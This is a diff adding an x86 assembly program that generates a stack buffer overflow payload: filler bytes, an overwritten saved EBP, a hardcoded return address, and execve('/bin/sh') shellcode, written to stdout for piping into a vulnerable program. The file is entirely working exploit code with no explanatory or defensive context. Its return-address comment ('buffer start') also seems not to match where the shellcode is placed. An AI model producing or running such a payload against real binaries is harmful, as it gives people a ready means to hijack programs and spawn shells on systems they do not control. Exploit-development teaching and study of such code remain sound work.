@@ -1,0 +1,52 @@
+; x86 assembly to craft buffer overflow input
+section .data
+    ; Shellcode: execve("/bin/sh")
+    shellcode db 0x31, 0xc0, 0x50, 0x68, 0x2f, 0x2f, 0x73, 0x68, 0x68, 0x2f, 0x62, 0x69, 0x6e, 0x89, 0xe3, 0x89, 0xc1, 0x89, 0xc2, 0xb0, 0x0b, 0xcd, 0x80
+    shellcode_len equ $ - shellcode
+
+    ; Buffer overflow payload
+    ; 16 bytes (buffer) + 4 bytes (saved EBP) + 4 bytes (return address) + shellcode
+    buffer db 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41  ; 8 bytes of filler (A's)
+    buffer_cont db 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41  ; 8 more bytes
+    saved_ebp db 0x42, 0x42, 0x42, 0x42  ; Overwrite saved EBP (filler)
+    ret_addr db 0xe0, 0xd5, 0xff, 0xff  ; Return address (0xffffd5e0, buffer start)
+
+section .bss
+    output resb 100  ; Buffer to store final payload
+
+section .text
+global _start
+
+_start:
+    ; Copy buffer to output
+    mov esi, buffer
+    mov edi, output
+    mov ecx, 16
+    rep movsb  ; Copy 16 bytes of buffer
+
+    ; Copy saved EBP
+    mov esi, saved_ebp
+    mov ecx, 4
+    rep movsb  ; Copy 4 bytes
+
+    ; Copy return address
+    mov esi, ret_addr
+    mov ecx, 4
+    rep movsb  ; Copy 4 bytes
+
+    ; Copy shellcode
+    mov esi, shellcode
+    mov ecx, shellcode_len
+    rep movsb  ; Copy shellcode
+
+    ; Write payload to stdout (for piping to vulnerable program)
+    mov eax, 4          ; sys_write
+    mov ebx, 1          ; stdout
+    mov ecx, output     ; payload
+    mov edx, 16 + 4 + 4 + shellcode_len  ; Total length
+    int 0x80
+
+    ; Exit
+    mov eax, 1          ; sys_exit
+    xor ebx, ebx        ; status 0
+    int 0x80
